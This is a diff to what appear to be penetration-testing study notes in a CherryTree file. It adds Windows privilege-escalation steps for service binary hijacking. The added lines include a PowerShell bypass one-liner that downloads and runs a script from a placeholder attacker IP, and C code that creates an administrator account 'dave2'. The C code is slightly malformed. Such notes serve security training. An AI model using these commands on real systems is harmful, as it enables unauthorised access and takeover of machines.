@@ -1121,7 +1121,7 @@ net start &lt;ServiceName&gt;
       </row>
     </table>
   </node>
-  <node name="Privilege Escalation" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741363139" ts_lastsave="1741509487">
+  <node name="Privilege Escalation" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741363139" ts_lastsave="1741517795">
     <rich_text>
 </rich_text>
     <rich_text scale="h2" weight="heavy">Linux Privilege Escalation</rich_text>
@@ -1771,7 +1771,52 @@ Got these :
 [client]
 password
 port=3306
-socket="C:/xampp/mysq1/mysql.sock"</rich_text>
+socket="C:/xampp/mysq1/mysql.sock"
+
+runas /user:backupadmin
+
+type powershell
+</rich_text>
+    <rich_text scale="h1" background="#ffffffffffff">Powershell History</rich_text>
+    <rich_text>
+(Get-PSReadlineOption).HistorySavePath
+ 
+
+Automated Tool for Enumeration:
+
+
+</rich_text>
+    <rich_text weight="heavy">Service Binary Hijacking</rich_text>
+    <rich_text> 
+
+Get-CimInstance -ClassName win32_service | Select Name, State, PathNameRunning'}
+
+Correct
+Get-CimInstance -ClassName Win32_Service | Select Name, State, PathName
+
+icacls "C:\xampp\apache\bin\httpd.exe"
+
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('</rich_text>
+    <rich_text link="webs http://">http://</rich_text>
+    <rich_text>&lt;your_ip&gt;/script.ps1')": Download and execute a PowerShell script
+
+
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+
+
+#include &lt;stdlib.h&gt;
+
+int main ()
+
+int i;
+{
+i = system ("net user dave2 password123! /add");
+i = system ("net localgroup administrators dave2 /add");
+
+return 0;
+}</rich_text>
   </node>
   <node name="Password Cracking" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741258017" ts_lastsave="1741261729">
     <rich_text>
